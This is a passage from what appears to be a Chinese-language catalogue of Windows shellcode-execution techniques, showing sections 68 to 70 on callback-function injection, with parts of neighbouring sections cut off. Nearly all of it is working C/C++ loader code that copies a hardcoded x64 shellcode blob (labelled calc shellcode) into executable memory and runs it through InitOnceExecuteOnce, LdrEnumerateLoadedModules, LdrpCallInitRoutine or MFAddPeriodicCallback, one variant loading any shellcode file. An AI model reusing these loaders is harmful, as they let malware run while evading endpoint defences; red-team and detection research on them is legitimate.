class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hProcess&nbsp;=&nbsp;::GetCurrentProcess();<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;lpContext;<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;bStatus;<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;INIT_ONCE&nbsp;g_InitOnce&nbsp;=&nbsp;INIT_ONCE_STATIC_INIT;<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;::InitOnceExecuteOnce(&amp;g_InitOnce,&nbsp;(PINIT_ONCE_FN)address,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;&amp;lpContext);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>}<br></code></pre>
<h1 id="h68ldrenumerateloadedmodules"><span>68.回调函数注入 通过 LdrEnumerateLoadedModules</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><span class="hljs-comment">//&nbsp;including&nbsp;ntdef.h&nbsp;was&nbsp;breaking&nbsp;the&nbsp;program&nbsp;so&nbsp;I&nbsp;just&nbsp;simply&nbsp;got&nbsp;the&nbsp;typedef&nbsp;from:</span><br><span class="linenum hljs-number">27</span><span class="hljs-comment">//&nbsp;https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-class"><span class="hljs-keyword">struct</span>&nbsp;_<span class="hljs-title">UNICODE_STRING</span>&nbsp;{</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;Length;<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;MaximumLength;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;PWSTR&nbsp;&nbsp;Buffer;<br><span class="linenum hljs-number">33</span>}&nbsp;UNICODE_STRING,&nbsp;*&nbsp;PUNICODE_STRING;<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><span class="hljs-comment">//&nbsp;https://doxygen.reactos.org/d1/d97/ldrtypes_8h_source.html</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><span class="hljs-keyword">typedef</span>&nbsp;PVOID&nbsp;PACTIVATION_CONTEXT;<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-class"><span class="hljs-keyword">struct</span>&nbsp;_<span class="hljs-title">LDR_DATA_TABLE_ENTRY</span><br><span class="linenum hljs-number">40</span>{</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;LIST_ENTRY&nbsp;InLoadOrderLinks;<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;LIST_ENTRY&nbsp;InMemoryOrderLinks;<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;LIST_ENTRY&nbsp;InInitializationOrderLinks;<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;DllBase;<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;EntryPoint;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;SizeOfImage;<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;FullDllName;<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;BaseDllName;<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Flags;<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;LoadCount;<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;TlsIndex;<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">union</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LIST_ENTRY&nbsp;HashLinks;<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-class"><span class="hljs-keyword">struct</span><br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;SectionPointer;<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CheckSum;<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;};<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">union</span><br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;TimeDateStamp;<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;LoadedImports;<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;};<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;PACTIVATION_CONTEXT&nbsp;EntryPointActivationContext;<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;PatchInformation;<br><span class="linenum hljs-number">68</span>}&nbsp;LDR_DATA_TABLE_ENTRY,&nbsp;*&nbsp;PLDR_DATA_TABLE_ENTRY;<br><span class="linenum hljs-number">69</span><br><span class="linenum hljs-number">70</span><span class="hljs-function"><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-title">VOID</span><span class="hljs-params">(NTAPI&nbsp;LDR_ENUM_CALLBACK)</span><span class="hljs-params">(_In_&nbsp;PLDR_DATA_TABLE_ENTRY&nbsp;ModuleInformation,&nbsp;_In_&nbsp;PVOID&nbsp;Parameter,&nbsp;_Out_&nbsp;BOOLEAN*&nbsp;Stop)</span></span>;<br><span class="linenum hljs-number">71</span><span class="hljs-keyword">typedef</span>&nbsp;LDR_ENUM_CALLBACK*&nbsp;PLDR_ENUM_CALLBACK;<br><span class="linenum hljs-number">72</span><br><span class="linenum hljs-number">73</span><span class="hljs-comment">//&nbsp;https://doxygen.reactos.org/d7/d55/ldrapi_8c.html#ac623c02eff0b751a63f8573eaca95153</span><br><span class="linenum hljs-number">74</span><br><span class="linenum hljs-number">75</span><span class="hljs-function"><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall*&nbsp;_LdrEnumerateLoadedModules)</span><span class="hljs-params">(<br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReservedFlag,<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;LDR_ENUM_CALLBACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EnumProc,<br><span class="linenum hljs-number">78</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;context<br><span class="linenum hljs-number">79</span>&nbsp;&nbsp;&nbsp;&nbsp;)</span></span>;<br><span class="linenum hljs-number">80</span><br><span class="linenum hljs-number">81</span><br><span class="linenum hljs-number">82</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">83</span><br><span class="linenum hljs-number">84</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">85</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">86</span><br><span class="linenum hljs-number">87</span>&nbsp;&nbsp;&nbsp;&nbsp;HMODULE&nbsp;hNtdll&nbsp;=&nbsp;::GetModuleHandleW(<span class="hljs-string">L"ntdll"</span>);<br><span class="linenum hljs-number">88</span><br><span class="linenum hljs-number">89</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hNtdll)&nbsp;{<br><span class="linenum hljs-number">90</span><br><span class="linenum hljs-number">91</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_LdrEnumerateLoadedModules&nbsp;LdrEnumerateLoadedModules&nbsp;=&nbsp;(_LdrEnumerateLoadedModules)::GetProcAddress(hNtdll,&nbsp;<span class="hljs-string">"LdrEnumerateLoadedModules"</span>);<br><span class="linenum hljs-number">92</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LdrEnumerateLoadedModules(<span class="hljs-literal">NULL</span>,&nbsp;(PLDR_ENUM_CALLBACK)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">93</span><br><span class="linenum hljs-number">94</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">95</span><br><span class="linenum hljs-number">96</span>}<br></code></pre>
<h1 id="h69ldrpcallinitroutine"><span>69.回调函数注入 通过 LdrpCallInitRoutine</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><span class="hljs-function"><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-title">size_t</span><span class="hljs-params">(__fastcall*&nbsp;lpCallInitRoutine)</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span>,&nbsp;<span class="hljs-keyword">size_t</span>,&nbsp;<span class="hljs-keyword">size_t</span>)</span></span>;<br><span class="linenum hljs-number">28</span><span class="hljs-function"><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-title">char</span><span class="hljs-params">(__fastcall*&nbsp;pLdrpCallInitRoutine)</span><span class="hljs-params">(lpCallInitRoutine,&nbsp;<span class="hljs-keyword">size_t</span>,&nbsp;<span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">int</span>,&nbsp;<span class="hljs-keyword">size_t</span>)</span></span>;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>&nbsp;NTDLL_LDRPCALLINITRT_OFFSET&nbsp;0x000199bc</span><br><span class="linenum hljs-number">31</span><span class="hljs-comment">//&nbsp;?&nbsp;ntdll!LdrpCallInitRoutine&nbsp;-&nbsp;ntdll</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hProcess&nbsp;=&nbsp;::GetCurrentProcess();<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!address)&nbsp;{&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">-1</span>;&nbsp;}<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uintptr_t</span>&nbsp;hNtdll&nbsp;=&nbsp;(<span class="hljs-keyword">uintptr_t</span>)GetModuleHandleA(<span class="hljs-string">"ntdll"</span>);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!hNtdll)&nbsp;{&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">-1</span>;&nbsp;}<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;todo:&nbsp;find&nbsp;a&nbsp;better&nbsp;way&nbsp;to&nbsp;get&nbsp;LdrpCallInitRoutine.&nbsp;I'm&nbsp;lazy&nbsp;right&nbsp;now.</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uintptr_t</span>&nbsp;func&nbsp;=&nbsp;hNtdll&nbsp;+&nbsp;NTDLL_LDRPCALLINITRT_OFFSET;<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;pLdrpCallInitRoutine&nbsp;LdrpCallInitRoutine&nbsp;=&nbsp;(pLdrpCallInitRoutine)func;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;LdrpCallInitRoutine((lpCallInitRoutine)address,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>}<br></code></pre>
<h1 id="h70mfaddperiodiccallback"><span>70.回调函数注入 通过 MFAddPeriodicCallback</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Mfplat.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;mfapi.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;dwKey&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">19</span><br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;MFAddPeriodicCallback.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;MFStartup(MF_VERSION,&nbsp;MFSTARTUP_NOSOCKET);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;MFAddPeriodicCallback((MFPERIODICCALLBACK)hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;&amp;dwKey);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;Sleep(<span class="hljs-number">10000</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum 